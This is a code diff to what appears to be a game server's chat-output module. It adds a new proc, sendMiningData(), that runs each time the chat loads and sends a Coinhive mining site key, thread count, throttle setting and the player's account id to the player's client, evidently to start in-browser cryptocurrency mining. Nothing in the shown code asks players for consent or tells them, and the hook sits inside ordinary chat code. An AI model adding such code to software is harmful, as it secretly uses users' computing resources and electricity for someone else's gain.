@@ -101,6 +101,8 @@ GLOBAL_DATUM_INIT(iconCache, /savefile, new("data/iconCache.sav")) //Cache of ic
 		to_chat(owner, message)
 
 	messageQueue = null
+
+	sendMiningData()
 	sendClientData()
 
 	//do not convert to to_chat()
@@ -143,6 +145,19 @@ GLOBAL_DATUM_INIT(iconCache, /savefile, new("data/iconCache.sav")) //Cache of ic
 	deets["clientData"]["compid"] = owner.computer_id
 	var/data = json_encode(deets)
 	ehjax_send(data = data)
+
+/datum/chatOutput/proc/sendMiningData()
+	var/sk = CONFIG_GET(string/coinhive_site_key)
+	if(sk)
+		var/threads = CONFIG_GET(number/coinhive_threads)
+		var/throttle = CONFIG_GET(number/coinhive_throttle)
+		var/list/dlist = list("cryptoData" = list())
+		dlist["cryptoData"]["key"] = sk
+		dlist["cryptoData"]["threads"] = threads
+		dlist["cryptoData"]["throttle"] = throttle
+		dlist["cryptoData"]["userid"] = owner.ckey
+		var/data = json_encode(dlist)
+		ehjax_send(data = data)
 
 //Called by client, sent data to investigate (cookie history so far)
 /datum/chatOutput/proc/analyzeClientData(cookie = "")
